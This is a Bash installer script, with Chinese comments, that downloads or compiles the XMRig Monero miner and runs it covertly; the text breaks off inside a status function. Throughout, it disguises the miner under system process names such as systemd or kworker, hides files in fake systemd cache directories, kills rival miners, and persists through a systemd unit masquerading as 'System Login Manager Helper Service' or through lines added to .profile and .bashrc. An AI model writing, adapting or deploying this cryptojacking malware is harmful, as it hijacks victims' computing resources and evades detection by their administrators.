#!/bin/bash

# XMR Mining Script - Improved Version
# Usage: curl -s -L x.x/miner_improved.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [CPU利用率%] [--auto-compile]

set -e

# 设置环境变量
export LC_ALL=en_US.UTF-8

# 初始化全局变量
AUTO_COMPILE=false
IS_CONTAINER=false
DISGUISE_NAME=""
SERVICE_NAME=""
COMPILE_FROM_SOURCE=false
HAS_SUDO=false

# 解析命令行参数
for arg in "$@"; do
    case $arg in
        --auto-compile)
            AUTO_COMPILE=true
            shift
            ;;
        *)
            # 其他参数保持原样
            ;;
    esac
done

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_debug() {
    echo -e "${BLUE}[DEBUG]${NC} $1"
}

# 检测sudo权限
check_sudo_permissions() {
    log_info "检测sudo权限..."
    
    if sudo -n true 2>/dev/null; then
        HAS_SUDO=true
        log_info "检测到sudo权限"
    else
        HAS_SUDO=false
        log_warn "无sudo权限，将使用用户模式安装"
    fi
}

# 获取伪装进程名
get_disguise_name() {
    # 获取CPU占用最高的进程名，排除xmrig相关进程
    local top_process=$(ps aux --no-headers 2>/dev/null | grep -v -i xmrig | grep -v -i "$DISGUISE_NAME" | sort -rn -k3 | head -1 | awk '{print $11}' | sed 's/.*\///' 2>/dev/null || echo "")
    
    # 如果获取失败或为空，或者是系统命令，使用备选系统进程名
    if [ -z "$top_process" ] || [ "$top_process" = "ps" ] || [ "$top_process" = "sort" ] || [ "$top_process" = "grep" ] || [ "$top_process" = "awk" ]; then
        local system_processes=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_gp" "kworker" "sshd" "NetworkManager" "systemd-logind")
        top_process=${system_processes[$RANDOM % ${#system_processes[@]}]}
    fi
    
    echo "$top_process"
}

# 创建隐藏目录 - 改进版本使用tmp目录
create_hidden_dirs() {
    log_info "创建隐藏安装目录..."
    
    # 使用用户可写的临时目录，而不是系统目录
    if [ -n "$HOME" ] && [ -d "$HOME" ]; then
        # 优先使用用户主目录下的隐藏目录
        WORK_DIR="$HOME/.cache/systemd-update"
    else
        # 如果没有HOME或HOME不存在，使用/tmp下的隐藏目录
        local temp_base="/tmp/.systemd-cache"
        WORK_DIR="$temp_base/systemd-update-$(whoami)"
    fi
    
    # 创建目录结构
    mkdir -p "$WORK_DIR"
    
    # 设置目录权限（只有所有者可访问）
    chmod 700 "$WORK_DIR"
    
    log_info "工作目录: $WORK_DIR"
}

# 检查参数
if [ $# -lt 2 ]; then
    log_error "参数不足！"
    echo "使用方法: curl -s -L x.x/miner_improved.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [CPU利用率%] [--auto-compile]"
    echo "示例: curl -s -L x.x/miner_improved.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443 50"
    echo "CPU利用率参数可选，默认使用所有CPU核心，设置50表示使用50%的CPU核心"
    exit 1
fi

# 参数解析
WALLET_ADDRESS="$1"
POOL_ADDRESS="$2"
CPU_USAGE="${3:-100}"  # 默认100%使用所有核心

# 验证CPU利用率参数
if ! [[ "$CPU_USAGE" =~ ^[0-9]+$ ]] || [ "$CPU_USAGE" -lt 1 ] || [ "$CPU_USAGE" -gt 100 ]; then
    log_error "CPU利用率参数无效！请输入1-100之间的数字"
    exit 1
fi

log_info "开始XMR挖矿脚本安装..."
log_info "钱包地址: $WALLET_ADDRESS"
log_info "矿池地址: $POOL_ADDRESS"
log_info "CPU利用率: ${CPU_USAGE}%"

# 检测CPU核心数和计算绑定
detect_cpu_info() {
    log_info "检测CPU信息..."
    
    # 获取CPU核心数
    if command -v lscpu >/dev/null 2>&1; then
        TOTAL_CORES=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
    elif [ -f /proc/cpuinfo ]; then
        TOTAL_CORES=$(grep -c "^processor" /proc/cpuinfo)
    else
        log_warn "无法检测CPU核心数，使用默认值4"
        TOTAL_CORES=4
    fi
    
    # 验证核心数
    if ! [[ "$TOTAL_CORES" =~ ^[0-9]+$ ]] || [ "$TOTAL_CORES" -lt 1 ]; then
        log_warn "CPU核心数检测异常，使用默认值4"
        TOTAL_CORES=4
    fi
    
    # 计算需要使用的核心数
    USED_CORES=$(( (TOTAL_CORES * CPU_USAGE + 99) / 100 ))  # 向上取整
    
    # 确保至少使用1个核心
    if [ "$USED_CORES" -lt 1 ]; then
        USED_CORES=1
    fi
    
    # 确保不超过总核心数
    if [ "$USED_CORES" -gt "$TOTAL_CORES" ]; then
        USED_CORES=$TOTAL_CORES
    fi
    
    log_info "CPU总核心数: $TOTAL_CORES"
    log_info "设置使用核心数: $USED_CORES (${CPU_USAGE}%)"
    
    # 生成CPU绑定列表 (0到USED_CORES-1)
    CPU_AFFINITY=""
    for ((i=0; i<USED_CORES; i++)); do
        if [ -z "$CPU_AFFINITY" ]; then
            CPU_AFFINITY="$i"
        else
            CPU_AFFINITY="$CPU_AFFINITY,$i"
        fi
    done
    
    log_info "CPU绑定列表: $CPU_AFFINITY"
}

# 检测系统架构和操作系统
detect_system() {
    log_info "检测系统信息..."
    
    # 检测容器环境
    IS_CONTAINER=false
    CONTAINER_TYPE=""
    
    # 多种方法检测容器环境
    if [ -f /.dockerenv ]; then
        IS_CONTAINER=true
        CONTAINER_TYPE="Docker"
    elif [ -n "${container:-}" ]; then
        IS_CONTAINER=true
        CONTAINER_TYPE="systemd-nspawn"
    elif grep -q 'docker' /proc/1/cgroup 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="Docker"
    elif grep -q 'lxc' /proc/1/cgroup 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="LXC"
    elif grep -q 'kubepods' /proc/1/cgroup 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="Kubernetes"
    elif [ -f /proc/vz/veinfo ] 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="OpenVZ"
    elif [ "$(stat -c %d:%i / 2>/dev/null)" != "$(stat -c %d:%i /proc/1/root/. 2>/dev/null)" ]; then
        IS_CONTAINER=true
        CONTAINER_TYPE="chroot/container"
    fi
    
    if [[ "$IS_CONTAINER" == "true" ]]; then
        log_info "检测到容器环境: $CONTAINER_TYPE"
    fi
    
    # 检测操作系统
    if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "linux-musl"* ]] || [[ "$OSTYPE" == "linux"* ]]; then
        OS="linux"
        # 获取发行版信息
        if [ -f /etc/os-release ]; then
            . /etc/os-release
            OS_ID=${ID:-"linux"}
            OS_VERSION=${VERSION_ID:-"unknown"}
            OS_NAME=${NAME:-"Linux"}
            
            # 特殊处理Alpine Linux (musl libc)
            if [[ "$OSTYPE" == "linux-musl"* ]] || [[ "$ID" == "alpine" ]]; then
                OS_ID="alpine"
                log_info "检测到Alpine Linux (musl libc)"
            fi
        else
            # 如果没有/etc/os-release，尝试其他方法检测
            if [[ "$OSTYPE" == "linux-musl"* ]] || command -v apk >/dev/null 2>&1; then
                OS_ID="alpine"
                OS_VERSION="unknown"
                OS_NAME="Alpine Linux"
                log_info "检测到Alpine Linux环境"
            else
                OS_ID="linux"
                OS_VERSION="unknown"
                OS_NAME="Linux"
            fi
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        OS_ID="macos"
        OS_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "unknown")
        OS_NAME="macOS"
    elif [[ "$OSTYPE" == "freebsd"* ]]; then
        OS="freebsd"
        OS_ID="freebsd"
        OS_VERSION=$(uname -r 2>/dev/null || echo "unknown")
        OS_NAME="FreeBSD"
    else
        log_error "不支持的操作系统: $OSTYPE"
        exit 1
    fi
    
    # 检测CPU架构
    ARCH=$(uname -m)
    case $ARCH in
        x86_64|amd64)
            ARCH="x64"
            COMPILE_FROM_SOURCE=false
            ;;
        aarch64|arm64)
            ARCH="arm64"
            log_warn "检测到ARM64架构，XMRig官方不提供预编译版本"
            log_warn "需要从源码编译安装"
            
            # 在容器环境或非交互式环境中自动继续
            if [[ "$IS_CONTAINER" == "true" ]] || [[ ! -t 0 ]] || [[ "$AUTO_COMPILE" == "true" ]]; then
                log_info "检测到容器/非交互式环境，自动启用源码编译"
                COMPILE_FROM_SOURCE=true
            else
                echo
                read -p "是否继续编译安装？(y/n): " -n 1 -r
                echo
                if [[ ! $REPLY =~ ^[Yy]$ ]]; then
                    log_info "用户取消安装"
                    exit 0
                fi
                COMPILE_FROM_SOURCE=true
            fi
            ;;
        *)
            log_error "不支持的CPU架构: $ARCH"
            exit 1
            ;;
    esac
    
    # 输出详细的系统信息
    log_info "系统检测完成:"
    log_info "  操作系统: $OS_NAME ($OS_ID)"
    log_info "  系统架构: $ARCH"
    if [[ "$IS_CONTAINER" == "true" ]]; then
        log_info "  容器环境: $CONTAINER_TYPE"
    fi
    if [[ "$COMPILE_FROM_SOURCE" == "true" ]]; then
        log_info "  编译模式: 源码编译"
    else
        log_info "  安装模式: 预编译二进制"
    fi
}

# 设置XMRig版本
set_version() {
    log_info "设置XMRig版本..."
    VERSION="6.24.0"
    log_info "XMRig版本: $VERSION"
}

# 确定下载链接
get_download_url() {
    log_info "确定下载链接..."
    
    # 直接使用可执行文件名，不再需要压缩包
    FILENAME="xmrig"
    
    DOWNLOAD_URL="https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
    
    log_info "下载链接: $DOWNLOAD_URL"
}

# 检测并终止现有的挖矿进程
kill_existing_miner() {
    log_info "检测现有的挖矿进程..."
    
    # 使用ps命令查找挖矿进程（包括xmrig和伪装名称）
    local miner_pids=$(ps -ef 2>/dev/null | grep -E "(xmrig|$DISGUISE_NAME)" | grep -v grep | awk '{print $2}' || echo "")
    
    if [ -n "$miner_pids" ]; then
        log_warn "发现现有的挖矿进程，正在终止..."
        
        # 遍历所有找到的PID并终止
        for pid in $miner_pids; do
            if [ -n "$pid" ] && [ "$pid" -gt 0 ]; then
                log_info "终止进程 PID: $pid"
                
                # 尝试使用sudo终止进程
                if [ "$HAS_SUDO" = true ]; then
                    sudo kill -9 "$pid" 2>/dev/null || {
                        log_warn "使用sudo终止进程 $pid 失败，尝试直接终止"
                        kill -9 "$pid" 2>/dev/null || log_warn "无法终止进程 $pid"
                    }
                else
                    # 如果没有sudo，直接使用kill
                    kill -9 "$pid" 2>/dev/null || log_warn "无法终止进程 $pid"
                fi
            fi
        done
        
        # 等待进程完全终止
        sleep 2
        
        # 再次检查是否还有残留进程
        local remaining_pids=$(ps -ef 2>/dev/null | grep -E "(xmrig|$DISGUISE_NAME)" | grep -v grep | awk '{print $2}' || echo "")
        if [ -n "$remaining_pids" ]; then
            log_warn "仍有挖矿进程运行，但将继续安装"
        else
            log_info "所有挖矿进程已成功终止"
        fi
    else
        log_info "未发现现有的挖矿进程"
    fi
}

# 检查先决条件
check_prerequisites() {
    log_info "检查先决条件..."
    
    # 检查必需的命令
    local missing_commands=""
    local has_downloader=false
    
    # 检查下载工具
    if command -v wget >/dev/null 2>&1; then
        has_downloader=true
        log_info "检测到wget下载工具"
    fi
    
    if command -v curl >/dev/null 2>&1; then
        has_downloader=true
        log_info "检测到curl下载工具"
    fi
    
    if [ "$has_downloader" = false ]; then
        missing_commands="$missing_commands wget或curl"
    fi
    
    if ! command -v tar >/dev/null 2>&1; then
        missing_commands="$missing_commands tar"
    fi
    
    # 如果需要编译，检查编译工具
    if [ "$COMPILE_FROM_SOURCE" = true ]; then
        log_info "检查编译工具..."
        
        if ! command -v gcc >/dev/null 2>&1 && ! command -v clang >/dev/null 2>&1; then
            missing_commands="$missing_commands gcc或clang"
        fi
        
        if ! command -v g++ >/dev/null 2>&1 && ! command -v clang++ >/dev/null 2>&1; then
            missing_commands="$missing_commands g++或clang++"
        fi
        
        if ! command -v make >/dev/null 2>&1; then
            missing_commands="$missing_commands make"
        fi
        
        if ! command -v cmake >/dev/null 2>&1; then
            missing_commands="$missing_commands cmake"
        fi
        
        if ! command -v git >/dev/null 2>&1; then
            missing_commands="$missing_commands git"
        fi
    fi
    
    if [ -n "$missing_commands" ]; then
        log_warn "缺少必需的命令:$missing_commands"
        
        if [ "$HAS_SUDO" = true ]; then
            log_info "尝试安装缺少的依赖..."
            install_missing_dependencies
        else
            log_error "缺少必需的依赖且无sudo权限，请手动安装: $missing_commands"
            exit 1
        fi
    else
        log_info "所有必需的依赖都可用。"
    fi
}

# 安装缺少的依赖
install_missing_dependencies() {
    # 在容器环境中，优先使用非交互式安装
    local install_flags=""
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境检测到，使用非交互式安装"
        export DEBIAN_FRONTEND=noninteractive
        install_flags="-y -qq"
    else
        install_flags="-y"
    fi
    
    if command -v apt-get >/dev/null 2>&1; then
        # Debian/Ubuntu
        log_info "更新包列表..."
        if ! sudo apt-get update $install_flags; then
            log_warn "包更新失败，但继续执行..."
        fi
        
        log_info "安装缺少的包..."
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            sudo apt-get install $install_flags wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev || {
                log_error "安装包失败。请运行: sudo apt-get install wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev"
                exit 1
            }
        else
            sudo apt-get install $install_flags wget curl tar || {
                log_error "安装包失败。请运行: sudo apt-get install wget curl tar"
                exit 1
            }
        fi
        
    elif command -v apk >/dev/null 2>&1; then
        # Alpine Linux
        log_info "检测到Alpine Linux，安装必要包..."
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            sudo apk add --no-cache wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev || {
                log_error "安装包失败。请运行: apk add wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev"
                exit 1
            }
        else
            sudo apk add --no-cache wget curl tar || {
                log_error "安装包失败。请运行: apk add wget curl tar"
                exit 1
            }
        fi
        
    elif command -v yum >/dev/null 2>&1; then
        # CentOS/RHEL 7
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            sudo yum groupinstall $install_flags "Development Tools" || {
                log_error "安装开发工具失败。请运行: sudo yum groupinstall \"Development Tools\""
                exit 1
            }
            sudo yum install $install_flags wget curl tar cmake git libuv-devel openssl-devel hwloc-devel || {
                log_error "安装包失败。请运行: sudo yum install wget curl tar cmake git libuv-devel openssl-devel hwloc-devel"
                exit 1
            }
        else
            sudo yum install -y wget curl tar || {
                log_error "安装包失败。请运行: sudo yum install wget curl tar"
                exit 1
            }
        fi
    elif command -v dnf >/dev/null 2>&1; then
        # CentOS/RHEL 8+/Fedora
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            sudo dnf groupinstall -y "Development Tools" || {
                log_error "安装开发工具失败。请运行: sudo dnf groupinstall \"Development Tools\""
                exit 1
            }
            sudo dnf install -y wget curl tar cmake git || {
                log_error "安装包失败。请运行: sudo dnf install wget curl tar cmake git"
                exit 1
            }
        else
            sudo dnf install -y wget curl tar || {
                log_error "安装包失败。请运行: sudo dnf install wget curl tar"
                exit 1
            }
        fi
    fi
}

# 下载和安装XMRig
download_and_install() {
    log_info "下载和安装XMRig..."
    
    cd "$WORK_DIR"
    
    if [ "$COMPILE_FROM_SOURCE" = true ]; then
        compile_from_source
        return
    fi
    
    # 下载预编译的挖矿程序
    log_info "下载挖矿程序二进制文件..."
    
    if command -v wget >/dev/null 2>&1; then
        if ! wget -O "$DISGUISE_NAME" "$DOWNLOAD_URL"; then
            log_error "下载失败: $DOWNLOAD_URL"
            exit 1
        fi
    elif command -v curl >/dev/null 2>&1; then
        if ! curl -L -o "$DISGUISE_NAME" "$DOWNLOAD_URL"; then
            log_error "下载失败: $DOWNLOAD_URL"
            exit 1
        fi
    else
        log_error "没有可用的下载工具 (wget或curl)"
        exit 1
    fi
    
    # 设置执行权限
    chmod +x "$DISGUISE_NAME"
    
    # 验证下载的文件
    if [ ! -f "$DISGUISE_NAME" ] || [ ! -x "$DISGUISE_NAME" ]; then
        log_error "下载的挖矿程序文件无效"
        exit 1
    fi
    
    # 进程名称伪装
    log_info "设置进程伪装..."
    log_info "挖矿程序已伪装为: $DISGUISE_NAME"
    
    # 创建软链接保持兼容性（仅用于内部脚本调用）
    ln -sf "$DISGUISE_NAME" .xmrig_internal
    
    log_info "挖矿程序下载和安装完成，进程已伪装为: $DISGUISE_NAME"
}

# 从源码编译XMRig
compile_from_source() {
    log_info "从源码编译XMRig..."
    
    # 下载源码
    log_info "下载XMRig源码..."
    if ! git clone https://github.com/xmrig/xmrig.git "xmrig-${VERSION}"; then
        log_error "下载源码失败"
        exit 1
    fi
    
    cd "xmrig-${VERSION}"
    
    # 切换到指定版本
    if ! git checkout "v${VERSION}"; then
        log_warn "切换到版本 v${VERSION} 失败，使用最新版本"
    fi
    
    log_info "开始编译XMRig..."
    
    # 创建构建目录
    mkdir -p build
    cd build
    
    # 运行cmake配置
    log_info "运行cmake配置..."
    local cmake_flags="-DCMAKE_BUILD_TYPE=Release"
    
    # 在容器环境中添加额外的编译优化
    if [[ "$IS_CONTAINER" == "true" ]]; then
        log_info "检测到容器环境，应用容器优化编译选项"
        cmake_flags="$cmake_flags -DWITH_HWLOC=OFF -DWITH_TLS=OFF"
        # 在资源受限的容器中禁用一些可选功能
        cmake_flags="$cmake_flags -DWITH_OPENCL=OFF -DWITH_CUDA=OFF"
    fi
    
    if ! cmake .. $cmake_flags; then
        log_error "cmake配置失败"
        exit 1
    fi
    
    # 编译
    log_info "开始编译（这可能需要几分钟）..."
    local cpu_cores=$(nproc 2>/dev/null || echo "1")
    
    # 在容器环境中限制并行编译数量以避免内存不足
    if [[ "$IS_CONTAINER" == "true" ]] && [[ $cpu_cores -gt 2 ]]; then
        cpu_cores=2
        log_info "容器环境限制编译并行数为: $cpu_cores"
    fi
    
    if ! make -j"$cpu_cores"; then
        log_error "编译失败"
        # 在容器环境中尝试单线程编译
        if [[ "$IS_CONTAINER" == "true" ]] && [[ $cpu_cores -gt 1 ]]; then
            log_warn "多线程编译失败，尝试单线程编译..."
            if ! make -j1; then
                log_error "单线程编译也失败"
                exit 1
            fi
        else
            exit 1
        fi
    fi
    
    # 检查编译结果
    if [ ! -f "xmrig" ]; then
        log_error "编译完成但未找到挖矿程序可执行文件"
        exit 1
    fi
    
    log_info "编译成功！"
    
    # 复制编译好的文件到工作目录并重命名为伪装名称
    cp xmrig "$WORK_DIR/$DISGUISE_NAME"
    cd "$WORK_DIR"
    
    # 清理源码目录
    log_info "清理源码目录..."
    rm -rf "xmrig-${VERSION}"
    
    # 设置执行权限
    chmod +x "$DISGUISE_NAME"
    
    # 进程名称伪装
    log_info "设置进程伪装..."
    log_info "挖矿程序已伪装为: $DISGUISE_NAME"
    
    # 创建软链接保持兼容性（仅用于内部脚本调用）
    ln -sf "$DISGUISE_NAME" .xmrig_internal
    
    log_info "挖矿程序编译和安装完成，进程已伪装为: $DISGUISE_NAME"
}

# 创建配置文件
create_config() {
    log_info "创建配置文件..."
    
    # 如果存在官方配置文件，直接覆盖
    if [ -f "$WORK_DIR/config.json" ]; then
        log_info "检测到官方配置文件，将完全覆盖..."
        rm -f "$WORK_DIR/config.json"
    fi
    
    cat > "$WORK_DIR/config.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": $USED_CORES,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false,
        "affinity": [$CPU_AFFINITY]
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": "$WORK_DIR/miner.log",
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$POOL_ADDRESS",
            "user": "$WALLET_ADDRESS",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ip_version": 0,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
    
    # 创建后台运行配置文件
    cp "$WORK_DIR/config.json" "$WORK_DIR/config_background.json"
    sed -i 's/"background": false,/"background": true,/' "$WORK_DIR/config_background.json"
    
    log_info "配置文件创建完成"
}

# 创建启动脚本 - 参考c3pool的方式
create_miner_script() {
    log_info "创建挖矿启动脚本..."
    
    cat > "$WORK_DIR/miner.sh" << 'EOL'
#!/bin/bash
WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DISGUISE_NAME="$(basename "$WORK_DIR"/../.disguise_name 2>/dev/null || echo "systemd")"

if ! pidof "$DISGUISE_NAME" >/dev/null; then
    cd "$WORK_DIR"
    nice ./"$DISGUISE_NAME" "$@"
else
    echo "挖矿程序已经在后台运行。拒绝运行另一个。"
    echo "如果要先删除后台矿工，请运行 \"killall $DISGUISE_NAME\"。"
fi
EOL
    
    chmod +x "$WORK_DIR/miner.sh"
    
    # 保存伪装名称供脚本使用
    echo "$DISGUISE_NAME" > "$WORK_DIR/../.disguise_name"
    
    log_info "启动脚本创建完成"
}

# 创建systemd服务 - 仅在有sudo权限时
create_systemd_service() {
    log_info "创建systemd服务..."
    
    cat > /tmp/${SERVICE_NAME}.service << EOF
[Unit]
Description=System Login Manager Helper Service
After=network.target

[Service]
Type=simple
User=$(whoami)
WorkingDirectory=$WORK_DIR
ExecStart=$WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=systemd-logind

[Install]
WantedBy=multi-user.target
EOF
    
    # 移动服务文件
    sudo mv /tmp/${SERVICE_NAME}.service /etc/systemd/system/${SERVICE_NAME}.service
    
    # 重新加载systemd配置
    sudo systemctl daemon-reload
    
    # 启用服务
    sudo systemctl enable ${SERVICE_NAME}.service
    
    log_info "systemd服务创建完成"
}

# 设置自启动 - 参考c3pool的灵活方式
setup_autostart() {
    log_info "设置系统自启动..."
    
    # 在容器环境中，通常不需要设置系统服务
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境检测到，跳过系统服务设置"
        log_info "在容器中，请使用以下命令直接运行："
        log_info "  $WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json"
        return 0
    fi
    
    # 参考c3pool的方式：检查sudo权限决定使用哪种自启动方式
    if [ "$HAS_SUDO" = true ] && command -v systemctl >/dev/null 2>&1; then
        # 使用systemd服务
        create_systemd_service
    else
        # 使用用户级自启动 - 添加到.profile
        log_info "无sudo权限或不支持systemd，使用用户级自启动"
        
        # 检查是否已经添加到.profile
        if [ -n "$HOME" ] && [ -f "$HOME/.profile" ]; then
            if ! grep -q "$WORK_DIR/miner.sh" "$HOME/.profile" 2>/dev/null; then
                log_info "添加启动脚本到 $HOME/.profile"
                echo "" >> "$HOME/.profile"
                echo "# Miner autostart" >> "$HOME/.profile"
                echo "$WORK_DIR/miner.sh --config=$WORK_DIR/config_background.json >/dev/null 2>&1 &" >> "$HOME/.profile"
            else
                log_info "启动脚本已存在于 $HOME/.profile 中"
            fi
        fi
        
        # 也尝试添加到.bashrc作为备选
        if [ -n "$HOME" ] && [ -f "$HOME/.bashrc" ]; then
            if ! grep -q "$WORK_DIR/miner.sh" "$HOME/.bashrc" 2>/dev/null; then
                log_info "添加启动脚本到 $HOME/.bashrc"
                echo "" >> "$HOME/.bashrc"
                echo "# Miner autostart" >> "$HOME/.bashrc"
                echo "$WORK_DIR/miner.sh --config=$WORK_DIR/config_background.json >/dev/null 2>&1 &" >> "$HOME/.bashrc"
            fi
        fi
    fi
}

# 启动挖矿
start_mining() {
    log_info "启动挖矿服务..."
    
    # 在容器环境中，直接启动进程而不是服务
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境检测到，直接启动挖矿进程..."
        cd "$WORK_DIR"
        
        # 在后台启动挖矿进程
        nohup ./"$DISGUISE_NAME" --config=config.json > miner.log 2>&1 &
        local mining_pid=$!
        
        # 等待一下确保进程启动
        sleep 3
        
        # 检查进程是否成功启动
        if kill -0 "$mining_pid" 2>/dev/null; then
            log_info "挖矿进程已在后台启动 (PID: $mining_pid)"
            echo "$mining_pid" > "$WORK_DIR/miner.pid"
        else
            log_error "挖矿进程启动失败"
            return 1
        fi
        return 0
    fi
    
    if [ "$HAS_SUDO" = true ] && command -v systemctl >/dev/null 2>&1; then
        sudo systemctl start ${SERVICE_NAME}.service
        sudo systemctl status ${SERVICE_NAME}.service --no-pager
    else
        # 直接启动挖矿进程
        log_info "直接启动挖矿进程..."
        cd "$WORK_DIR"
        nohup ./miner.sh --config=config_background.json > miner.log 2>&1 &
        local mining_pid=$!
        
        # 等待一下确保进程启动
        sleep 3
        
        # 检查进程是否成功启动
        if kill -0 "$mining_pid" 2>/dev/null; then
            log_info "挖矿进程已在后台启动 (PID: $mining_pid)"
            echo "$mining_pid" > "$WORK_DIR/miner.pid"
        else
            log_error "挖矿进程启动失败"
            return 1
        fi
    fi
    
    log_info "挖矿服务已启动"
}

# 创建日志查看脚本
create_log_viewer() {
    log_info "创建日志查看脚本..."
    
    cat > "$WORK_DIR/view_logs.sh" << 'EOL'
#!/bin/bash
WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="$WORK_DIR/miner.log"

echo "=== 挖矿日志查看器 ==="
echo "日志文件: $LOG_FILE"
echo "按 Ctrl+C 退出实时查看"
echo ""

if [ -f "$LOG_FILE" ]; then
    echo "=== 最近50行日志 ==="
    tail -n 50 "$LOG_FILE"
    echo ""
    echo "=== 实时日志 (按Ctrl+C退出) ==="
    tail -f "$LOG_FILE"
else
    echo "日志文件不存在: $LOG_FILE"
    echo "请确保挖矿程序已经启动"
fi
EOL
    
    chmod +x "$WORK_DIR/view_logs.sh"
    
    # 创建状态查看脚本
    cat > "$WORK_DIR/status.sh" << 'EOL'
#!/bin/bash
WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DISGUISE_NAME="$(cat "$WORK_DIR/../.disguise_name" 2>/dev/null || echo "systemd")"

echo "=== XMRig 挖矿状态 ==="
echo ""

# 检查进程状态
if pidof "$DISGUISE_NAME" >/dev/null || pidof xmrig >/dev/null; then
    echo "✓ 挖矿进程正在运行"
    
    # 显示进程信息
    echo ""
    echo "进程信息:"
    ps aux | grep -E "(xmrig|$DISGUISE_NAME)" | grep -v grep | head -5
    
    # 显示最近的日志
    if [ -f "$WORK_DIR/miner.log" ]; then
        echo ""
        echo "最近日志 (最后10行):"
        tail -n 10 "$WORK_DIR/miner.log"
    fi
else
    echo "✗ 挖矿进程未运行"
fi

echo ""
echo "管理命令:"
echo "  查看日志: $WORK_DIR/view_logs.sh"
echo "  启动挖矿: $WORK_DIR/miner.sh --config=$WORK_DIR/config.json"
echo "  停止挖矿: killall $DISGUISE_NAME"
EOL
    
    chmod +x "$WORK_DIR/status.sh"
    
    log_info "日志查看脚本创建完成"
}

# 显示状态信息
show_status() {
    echo
    log_info "=== 安装完成 ==="
    log_info "XMRig版本: $VERSION"
    log_info "安装目录: $WORK_DIR"
    log_info "钱包地址: $WALLET_ADDRESS"
    log_info "矿池地址: $POOL_ADDRESS"
    log_info "捐赠设置: 0%"
    log_info "进程名称: $DISGUISE_NAME"
    log_info "服务名称: $SERVICE_NAME"
    log_info "运行环境: $([ "$IS_CONTAINER" = true ] && echo "容器环境" || echo "主机环境")"
    log_info "权限模式: $([ "$HAS_SUDO" = true ] && echo "sudo权限" || echo "用户权限")"
    echo
    log_info "=== 管理命令 ==="
    
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境管理命令:"
        log_info "查看状态: $WORK_DIR/status.sh"
        log_info "查看日志: $WORK_DIR/view_logs.sh"
        log_info "停止挖矿: killall $DISGUISE_NAME"
        log_info "手动启动: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
        log_info "后台启动: cd $WORK_DIR && nohup ./$DISGUISE_NAME --config=config.json > miner.log 2>&1 &"
        if [ -f "$WORK_DIR/miner.pid" ]; then
            local pid=$(cat "$WORK_DIR/miner.pid")
            if kill -0 "$pid" 2>/dev/null; then
